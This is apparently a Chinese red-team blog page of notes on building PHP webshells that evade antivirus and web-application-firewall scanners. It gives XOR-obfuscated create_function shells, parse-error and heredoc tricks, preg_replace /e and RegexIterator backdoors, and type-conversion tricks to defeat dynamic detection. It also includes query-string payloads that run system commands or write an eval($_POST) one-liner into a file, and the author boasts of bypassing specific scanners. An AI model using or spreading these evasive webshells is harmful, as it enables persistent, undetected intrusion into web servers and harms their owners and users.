<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754282.png" srcset="/img/loading.gif" lazyload alt="image-20220514175455253"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755311.png" srcset="/img/loading.gif" lazyload alt="image-20220514175505265"></p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755585.png" srcset="/img/loading.gif" lazyload alt="image-20220514175510842">无语  不搞了  要学会放弃  下一个</p>
<h2 id="③-静态函数调用普通函数，或者普通函数调用静态函数。-（-冰蝎码启发-）-其他类静态函数"><a href="#③-静态函数调用普通函数，或者普通函数调用静态函数。-（-冰蝎码启发-）-其他类静态函数" class="headerlink" title="*③**静态函数调用普通函数，或者普通函数调用静态函数。**（**冰蝎码启发**）**:其他类静态函数();*"></a><em><strong>*③*</strong></em><em><strong>*静态函数调用普通函数，或者普通函数调用静态函数。*</strong></em><em><strong>*（*</strong></em><em><strong>*冰蝎码启发*</strong></em><em><strong>*）*</strong></em><em><strong>*:其他类静态函数();*</strong></em></h2><h2 id="⑤-我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。"><a href="#⑤-我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。" class="headerlink" title="*⑤**我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。*"></a><em><strong>*⑤*</strong></em><em><strong>*我们可不可以把webshell隐藏在多个正常的php文件中形成一个调用链，当然这种形式已经跳出了上传的场景，更加偏向于权限维持。我们也可以将webshell隐藏在php扩展中来绕过一些限制敏感函数执行的场景。其实这个思路已经有很多大佬做过了。也有一些开源的东西。*</strong></em></h2><h2 id="⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理"><a href="#⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理" class="headerlink" title="*⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理*"></a><em><strong>*⑥使用脚本把免杀shell中的函数名，类名，以及变量名进行随机化处理。把敏感函数eval，assert进行异或处理*</strong></em></h2><p>不建议异或处理。现在大部分异或处理已经很难过杀了</p>
<h2 id="⑦函数-异或"><a href="#⑦函数-异或" class="headerlink" title="*⑦函数+异或*"></a><em><strong>*⑦函数+异或*</strong></em></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?<span class="hljs-type">php</span><br><br><span class="hljs-variable">$num</span> <span class="hljs-operator">=</span> array(<span class="hljs-number">81</span>,<span class="hljs-number">64</span>,<span class="hljs-number">87</span>,<span class="hljs-number">83</span>,<span class="hljs-number">70</span>,<span class="hljs-number">87</span>,<span class="hljs-number">109</span>,<span class="hljs-number">84</span>,<span class="hljs-number">71</span>,<span class="hljs-number">92</span>,<span class="hljs-number">81</span>,<span class="hljs-number">70</span>,<span class="hljs-number">91</span>,<span class="hljs-number">93</span>,<span class="hljs-number">92</span>);<br><br>$xor_key = <span class="hljs-number">50</span>; <span class="hljs-comment">// xor key</span><br><br>foreach ($num <span class="hljs-type">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=</span>&gt; $value) &#123;<br><br>$num[$key] = chr($num[$key] ^ $xor_key);<br><br>&#125;<br><br>$a = implode($num);<br><br><span class="hljs-comment">// create_function组合</span><br><br>function <span class="hljs-title function_">v</span><span class="hljs-params">($param, $a)</span>&#123;<br><br><span class="hljs-keyword">return</span> $a(<span class="hljs-string">&quot;&quot;</span>,$param);<br><br>&#125;<br><br>$param = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">// 规避$_POST报毒</span><br><br>foreach ($GLOBALS <span class="hljs-type">as</span> <span class="hljs-variable">$key</span> <span class="hljs-operator">=</span>&gt; $value) &#123;<br><br><span class="hljs-keyword">if</span>($key == <span class="hljs-string">&#x27;_POST&#x27;</span>)&#123;<br><br>$param = $$key;<br><br>$param = $param[<span class="hljs-string">&#x27;x&#x27;</span>];<br><br>&#125;<br><br>&#125;<br><br>$b = v($param, $a);<br><br>$b();<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756897.png" srcset="/img/loading.gif" lazyload alt="image-20220514175633860"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756088.png" srcset="/img/loading.gif" lazyload alt="image-20220514175641032"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756500.png" srcset="/img/loading.gif" lazyload alt="image-20220514175649463"></p>
<p>异或太难了。可以说是即难又很不容易过waf的方法</p>
<h2 id="⑧利用空格和tab数构造字符"><a href="#⑧利用空格和tab数构造字符" class="headerlink" title="*⑧利用空格和tab数构造字符*"></a><em><strong>*⑧利用空格和tab数构造字符*</strong></em></h2><p>Pro版：如果将空格与 tab 分别用 2 个不同的不可见字符替换</p>
<p>就是unicode的17B4和17B5，这两个字符大部分不可见</p>
<p>大佬有些相关的脚本（使用的话必须php文本够长，不够的话脚本会自动填充，造成底部产生很多空格）</p>
<h2 id="⑨传统的绕过最终都会进行语法解析；-但是如果语法报错的话，就可能导致解析失败了-；-就可以利用这个来执行命令"><a href="#⑨传统的绕过最终都会进行语法解析；-但是如果语法报错的话，就可能导致解析失败了-；-就可以利用这个来执行命令" class="headerlink" title="*⑨传统的绕过最终都会进行语法解析；**但是如果语法报错的话，就可能导致解析失败了**；**就可以利用这个来执行命令*"></a><em><strong>*⑨传统的绕过最终都会进行语法解析；*</strong></em><em><strong>*但是如果语法报错的话，就可能导致解析失败了*</strong></em><em><strong>*；*</strong></em><em><strong>*就可以利用这个来执行命令*</strong></em></h2><p>参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247494666&idx=1&sn=f13db3c11d65d9867e13f750dc4bbb0a&chksm=cfa54819f8d2c10f56637e9de1119bb43d5f80b688d1195adbf609c2c2797b007040818e6a10&mpshare=1&scene=23&srcid=0307cWYujvf1n0EC7qLoRiWU&sharer_sharetime">………….</a></p>
<p>先基础的  </p>
<h3 id="1-利用-特殊符号来引起报错"><a href="#1-利用-特殊符号来引起报错" class="headerlink" title="1.利用\特殊符号来引起报错"></a>1.利用\特殊符号来引起报错</h3><?php

\echo `whoami`;?>

<p>环境php5.2可以执行</p>
<p>其他的都不行</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757427.png" srcset="/img/loading.gif" lazyload alt="image-20220514175732389"></p>
<h3 id="2-高版本php语法不换行来执行命令"><a href="#2-高版本php语法不换行来执行命令" class="headerlink" title="2.高版本php语法不换行来执行命令"></a>2.高版本php语法不换行来执行命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?=<br><br>$a=&lt;&lt;&lt; aa<br><br>assasssasssasssasssasssasssasssasssasssasssassss<br><br>aa;echo `whoami`<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p>适合7.3</p>
<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757681.png" srcset="/img/loading.gif" lazyload alt="image-20220514175751646" style="zoom:150%;" />

<ol start="3">
<li><h3 id="利用php不同版本十六进制来进行报错"><a href="#利用php不同版本十六进制来进行报错" class="headerlink" title="利用php不同版本十六进制来进行报错"></a>利用php不同版本十六进制来进行报错</h3></li>
</ol>
<p>在php7中不认为是数字，php5则依旧为数字<br>经过测试 5.3 和5.5可以成功执行命令，5.2和php7无法执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php<br><br>$s=substr(<span class="hljs-string">&quot;aabbccsystem&quot;</span>,<span class="hljs-string">&quot;0x6&quot;</span>);<br><br>$s(whoami)<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758714.png" srcset="/img/loading.gif" lazyload alt="image-20220514175843672"></p>
<p>这里我们就用高版本的来<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758359.png" srcset="/img/loading.gif" lazyload alt="image-20220514175852310"></p>
<p>连接看看<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759158.png" srcset="/img/loading.gif" lazyload alt="image-20220514175902103" style="zoom:150%;" /><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759828.png" srcset="/img/loading.gif" lazyload alt="image-20220514175906786"></p>
<p>看一下D盾<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759443.png" srcset="/img/loading.gif" lazyload alt="image-20220514175916398" style="zoom:150%;" /></p>
<p>太直接了</p>
<p>接下来就是免杀</p>
<p>我们先用marcr0phag3大佬的字符转空白脚本试一下<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759517.png" srcset="/img/loading.gif" lazyload alt="image-20220514175929481"></p>
<p>用不了</p>
<p>这个脚本的payload格式只能是命令执行函数。不难添加其他的</p>
<p>那我们使用它本来那个payload看下怎么样<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759670.png" srcset="/img/loading.gif" lazyload alt="image-20220514175939627"></p>
<p>还是报错？？</p>
<p>那就不搞这个了  尝试别的免杀<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759420.png" srcset="/img/loading.gif" lazyload alt="image-20220514175948368"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759863.png" srcset="/img/loading.gif" lazyload alt="image-20220514175954812"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800010.png" srcset="/img/loading.gif" lazyload alt="image-20220514180003972"></p>
<p>好的变成1了 基本上这个时安全狗都是直接过</p>
<p>提示我们内藏变量函数$str</p>
<p>那我们看一下能不能用别的字符去替代$str<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800287.png" srcset="/img/loading.gif" lazyload alt="image-20220514180013243"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800344.png" srcset="/img/loading.gif" lazyload alt="image-20220514180018291"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800977.png" srcset="/img/loading.gif" lazyload alt="image-20220514180023934"></p>
<p>改名字也没用</p>
<p>这就证明了这个是被逻辑查杀的</p>
<p>需要用其他方法</p>
<p>直接用环境变量<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800299.png" srcset="/img/loading.gif" lazyload alt="image-20220514180034259" style="zoom: 150%;" /></p>
<p>D盾免杀<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800599.png" srcset="/img/loading.gif" lazyload alt="image-20220514180042544" style="zoom:150%;" /><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800213.png" srcset="/img/loading.gif" lazyload alt="image-20220514180050170"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800637.png" srcset="/img/loading.gif" lazyload alt="image-20220514180056582"></p>
<p>火绒也过 真爽！</p>
<p>对于关键词的后传入对免杀安全狗，d盾，河马 等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化 用户可以对传出的post数据进行自定义脚本加密，再由webshell进行解密获取参数，那么以现在的软WAF查杀能力 几乎为0</p>
<h1 id="php后续"><a href="#php后续" class="headerlink" title="php后续"></a>php后续</h1><h2 id="免杀基础-常见Webshell特征分析"><a href="#免杀基础-常见Webshell特征分析" class="headerlink" title="免杀基础-常见Webshell特征分析"></a>免杀基础-常见Webshell特征分析</h2><p>C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php</p>
<h2 id="冰蝎webshell免杀"><a href="#冰蝎webshell免杀" class="headerlink" title="冰蝎webshell免杀"></a>冰蝎webshell免杀</h2><p>直接拿冰蝎码去除好特征后（直接打开备课的链接）拿到</p>
<p>C:\Users\e’e’t\Desktop\红队安全开发\免杀马的制作\php\加密网站 全打勾</p>
<p>不过只有在php7.0的时候可以解析</p>
<h2 id="分析别人的代码"><a href="#分析别人的代码" class="headerlink" title="分析别人的代码"></a>分析别人的代码</h2><p>1.php</p>
<p>传入参数c和d，array_map函数作用将<strong>作为函数，array</strong>作为参数，构造paylaod</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>assert&amp;d<span class="hljs-operator">=</span>system(<span class="hljs-variable">%27</span>ls<span class="hljs-variable">%27</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>2.php   php5.3.3</p>
<p><strong>create_function</strong> 函数会创建一个匿名函数（<code>lambda</code>样式），在第一个<code>echo</code>中显示出名字，并在第二个<code>echo</code>语句中执行了此函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>这里$a为函数，’ ‘为参数</p>
<p>那么可以看作为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &#x27;</span> ;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>传入payload</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">b</span><span class="hljs-operator">=</span> <span class="hljs-comment">;&#125;phpinfo();/*</span><br></code></pre></td></tr></table></figure>

<p>在function函数中即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27; &#x27;</span> ;&#125;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">/*</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure>

<p>后面的内容注释掉了，即执行命令<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231643426.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<p>3.php</p>
<p>跟上面一样，虽然有一点变形，但是再$b的打印上没有特殊之处，所以payload:</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">d</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;&#125;system(%27ls%27);/*</span><br></code></pre></td></tr></table></figure>

<p>4.php</p>
<p>没什么特别之处，assert直接作为函数执行，payload:</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?b=<span class="hljs-keyword">system</span>(%27ls;%27)<br></code></pre></td></tr></table></figure>

<p>5.php</p>
<p>*<em>call_user_func()*<em>函数的特点，知道后面的后面的*<em>为参数，前面的</em></em></em>*a**为函数即可</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">b</span>=system&amp;c=whoami<br></code></pre></td></tr></table></figure>

<p>6.php</p>
<p>基本上属于3的内容加强版，重点就是需要进行闭合，，代码变多了，payload没有出入，重点还是再**$code**的位置</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=<span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">system</span>(%27ls%27);<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>

<p>7.php</p>
<p>属于加强版本，**$sort_function<strong>的内容进行闭合，也就是</strong>sort_by**的参数值要实现闭合，构造payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?sort_by=%27<span class="hljs-string">&quot;]);&#125;system(%27whoami%27);/*</span><br></code></pre></td></tr></table></figure>

<p>8.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=<span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);%<span class="hljs-number">20</span><span class="hljs-meta">?&gt;</span>%<span class="hljs-number">20</span>&gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure>

<p>一句话木马写入2.php</p>
<p>也有其它解法直接进行命令执行。</p>
<h2 id="手动带他们进行分析"><a href="#手动带他们进行分析" class="headerlink" title="手动带他们进行分析"></a>手动带他们进行分析</h2><p>20220405.php</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br><span class="hljs-built_in">create_function</span>()用于在PHP中创建匿名(lambda-style)函数。可用于代码注入<br>array转化成数组<br><span class="hljs-keyword">@extract</span>把客户端表单中的变量名取出来<br>hello 写在闭合之后让php解析不了以为这个是个非php文件  <br><br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231729906.png" srcset="/img/loading.gif" lazyload alt="image-20220523172916521">看不出来<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231734653.png" srcset="/img/loading.gif" lazyload alt="image-20220523173415568"></p>
<p>证明我们直接写的b就是引用了 create_function(null,fun2());<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231736607.png" srcset="/img/loading.gif" lazyload alt="image-20220523173645546"></p>
<p>所以这个array是解析不出来引用的create_function，所以这个就需要extract的注释。而这个extrct估计就是来绕过的<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231742999.png" srcset="/img/loading.gif" lazyload alt="image-20220523174231931"></p>
<p>因为extract的原因所以看不了</p>
<h2 id="根据p神文章自写木马"><a href="#根据p神文章自写木马" class="headerlink" title="根据p神文章自写木马"></a>根据p神文章自写木马</h2><h3 id="利用修饰符e-php5-6-40"><a href="#利用修饰符e-php5-6-40" class="headerlink" title="利用修饰符e  php5.6.40"></a>利用修饰符e  php5.6.40</h3><p>PHP旧版本的preg类函数中存在一个修饰符 e ，&#x3D;&#x3D;增加了这个修饰符后，替换后的结果将会被放进eval执行&#x3D;&#x3D;。利用这个方法，即可构造一个不带eval关键字的Webshell，比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/.*/e&#x27;</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2333</span>])<br></code></pre></td></tr></table></figure>

<p>其实原理很简单，我们查看PHP文档可以发现， preg_replace 的第一个参数是支持传入字符串或数组的：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231754170.png" srcset="/img/loading.gif" lazyload alt="image-20220523175432082"></p>
<p>而我猜测检测引擎后端是只考虑了字符串的情况。所以，我使用下面这个简单的样本就绕过了QT引擎：</p>
<p>111.php?2&#x3D;phpinfo();</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">preg_replace</span>([<span class="hljs-string">&#x27;/.*/e&#x27;</span>], <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_replace 函数执行一个正则表达式的搜索和替换。<br><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br><span class="hljs-variable">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。<br><span class="hljs-variable">$replacement</span>: 用于替换的字符串或字符串数组。<br><span class="hljs-variable">$subject</span>: 要搜索替换的目标字符串或字符串数组。<br>如果 subject 是一个数组， <span class="hljs-title function_ invoke__">preg_replace</span>() 返回一个数组， 其他情况下返回一个字符串。<br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232041211.png" srcset="/img/loading.gif" lazyload alt="image-20220523204153105"></p>
<h3 id="那么我们也可以利用e修饰符。"><a href="#那么我们也可以利用e修饰符。" class="headerlink" title="那么我们也可以利用e修饰符。"></a>那么我们也可以利用e修饰符。</h3><p>样本简化之后如下：&#x3D;&#x3D;php 5.6.9&#x3D;&#x3D; </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>([<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]]); <br><br><span class="hljs-variable">$i</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegexIterator</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;regexp&quot;</span>],<span class="hljs-title class_">RegexIterator</span>::<span class="hljs-variable constant_">REPLACE</span>); <br><br><span class="hljs-variable">$i</span>-&gt;replacement=<span class="hljs-string">&#x27;$0&#x27;</span>; <br><br><span class="hljs-title function_ invoke__">iterator_to_array</span>(<span class="hljs-variable">$i</span>); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>222.php</p>
<p>?cmd&#x3D;phpinfo();&amp;regexp&#x3D;&#x2F;(.*)&#x2F;e<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231953862.png" srcset="/img/loading.gif" lazyload alt="image-20220523195317562"></p>
<p>原理很简单， php 将各类 preg 函数包装成了一个正则的迭代器类<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231922869.png" srcset="/img/loading.gif" lazyload alt="image-20220523192234575"></p>
<p>从底层代码上看，当 RegexIterator 的操作模式为 RegexIterator::REPLACE 时会和</p>
<p>preg_repalce 一样，会走到 php_pcre_replace_impl 来处理正则表达式，如果正则表达式中有e修</p>
<p>饰符会走到 preg_do_eval 进行命令执行</p>
<p>行</p>
<p>RegexIterator ：<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/83610987046d5a5ffea2777853d4a4f2d3313387/ext/spl/spl_iterators.c#L1922">https://github.com/php/php-src/blob/83610987046d5a5ffea2777853d4a4f2d3313387/ext/spl/spl_iterators.c#L1922</a></p>
<p>preg_repalce ：<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/c0d890e918ff7b4212ef5a2e118a165f2c8eda39/ext/pcre/php_pcre.c#L1156">https://github.com/php/php-src/blob/c0d890e918ff7b4212ef5a2e118a165f2c8eda39/ext/pcre/php_pcre.c#L1156</a></p>
<p>PS：这类利用方法还有 RecursiveRegexIterator （ RegexIterator 的子类）</p>
<h3 id="类型转换打断检测引擎正常执行"><a href="#类型转换打断检测引擎正常执行" class="headerlink" title="类型转换打断检测引擎正常执行"></a>类型转换打断检测引擎正常执行</h3><p>333.php</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$cmd = [<span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, ...$_GET[1], <span class="hljs-string">&#x27;watermelon&#x27;</span>]<span class="hljs-comment">; 1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231946938.png" srcset="/img/loading.gif" lazyload alt="image-20220523194613984">因此我猜测可能在动态检测的时候由于⽆法知道参数的值，动态执⾏的时候也会爆出此错误，导致代码 </p>
<p>不能执⾏下去，so如果我们可以找到其他的⽅法，通过传⼊参数的差异来打断动态执⾏，应该就可以绕 </p>
<p>过，我的思路是通过过set_error_handler捕获warrning抛出致命错误，</p>
<p>?x&#x3D;1&amp;1&#x3D;id</p>
<h3 id="php引用-php-lt-8"><a href="#php引用-php-lt-8" class="headerlink" title="php引用  php&lt;8"></a>php引用  php&lt;8</h3><p>其实这个问题最早在20多年前就被开发者提出了：<strong><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=6417">https://bugs.php.net/bug.php?id=6417</a></strong>，并且在后面几年一直有开发者在 php-bug 和手册的 note 中提及：</p>
<p><strong><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=6417">https://bugs.php.net/bug.php?id=6417</a></strong> </p>
<p><strong><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=7412">https://bugs.php.net/bug.php?id=7412</a></strong> </p>
<p><strong><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=15025">https://bugs.php.net/bug.php?id=15025</a></strong> </p>
<p><strong><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=20993">https://bugs.php.net/bug.php?id=20993</a></strong> </p>
<p><em><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.references.php">https://www.php.net/manual/zh/language.references.php</a></em></p>
<p>直到 php8 该“问题”还是依旧存在，没有修复的原因是因为 PHP 官方不认为是一个 bug ，并给出的解释</p>
<p>是：</p>
<p><strong>由于</strong> PHP <strong>内部工作的特殊性，如果对数组的单个元素进行引用，然后复制数组，无论是通过赋值还是通</strong></p>
<p><strong>过函数调用中的值传递，都会将引用复制为数组的一部分。这意味着对任一数组中任何此类元素的更改</strong></p>
<p><strong>都将在另一个数组（和其他引用中）中重复，即使数组具有不同的作用域（例如，一个是函数内部的参</strong></p>
<p><strong>数，另一个是全局的）！在复制时没有引用的元素，以及在复制数组后分配给其他元素的引用，将正常</strong></p>
<p><strong>工作（即独立于其他数组）。</strong></p>
<p>444.php</p>
